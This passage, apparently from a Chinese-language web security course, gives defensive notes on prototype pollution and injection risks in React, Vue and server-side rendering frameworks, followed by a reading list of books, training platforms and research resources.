- 升级到 `Object.create(null)`、`Map`，使用 `Object.freeze(Object.prototype)`，不直接 merge 用户输入到对象。

---

## 5.20 补充：现代前端框架的安全注意点

- **React**：默认转义文本，但 `dangerouslySetInnerHTML`、`href={userInput}`、SSR (`renderToString`) 含原始 HTML 时仍可注入
- **Vue 3**：`v-html` 等价于 React 的 dangerously，需手动 sanitize
- **Next.js / Remix / Nuxt**：服务端渲染需注意 `getServerSideProps` 内的 SSRF / 路径泄露
- **Server Components / Server Actions**：跨边界数据传递必须经过 trusted boundary 校验，不要直接 `dangerouslyAllowSSR`
- **Edge Runtime**：受限的 Web API 影响 sanitize 库的兼容性，谨慎选库

---

## 5.21 延伸阅读

### 教材

- Dafydd Stuttard, Marcus Pinto，《The Web Application Hacker's Handbook》（红宝书）
- Michal Zalewski，《The Tangled Web》
- Andrew Hoffman，《Web Application Security》O'Reilly 2020
- 《Real-World Bug Hunting》Peter Yaworski

### 训练平台

- PortSwigger Web Security Academy（必刷）
- HackTheBox / TryHackMe / OWASP Juice Shop
- Root-Me / WebGoat / DVWA

### 资源

- HackTricks：<https://book.hacktricks.xyz/>
- PayloadsAllTheThings：<https://github.com/swisskyrepo/PayloadsAllTheThings>
- OWASP Cheat Sheet Series：<https://cheatsheetseries.owasp.org/>
- Project Discovery 工具集：<https://projectdiscovery.io/>
- PortSwigger Research Blog：<https://portswigger.net/research>
- The Daily Swig

### 论文

- James Kettle，*HTTP Desync Attacks*，DEFCON 2019 / 2022
- Orange Tsai，*Breaking Parser Logic*，BlackHat 2018
- Snyk State of Open Source Security
- Cloudflare Annual Radar Reports
